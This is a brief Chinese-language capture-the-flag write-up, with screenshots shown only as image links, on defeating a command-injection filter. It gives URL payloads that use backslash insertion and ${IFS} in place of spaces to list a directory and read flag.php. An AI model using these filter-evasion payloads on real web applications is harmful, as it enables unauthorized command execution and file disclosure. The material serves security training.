![img](./assets/wps366.jpg)

 

过滤系统命令，空格，；数字 ，`,

\ 绕过

${IFS}绕过空格

 

首先构造payload：

?rce=ls${IFS}/

![img](./assets/wps367.jpg) 

 

查看当前目录

![img](./assets/wps368.jpg) 

 

 

查看flag.php

构造payload:

?rce=c\at${IFS}fl\ag.php  (c\at不能写成ca\t)

![img](./assets/wps369.jpg) 

 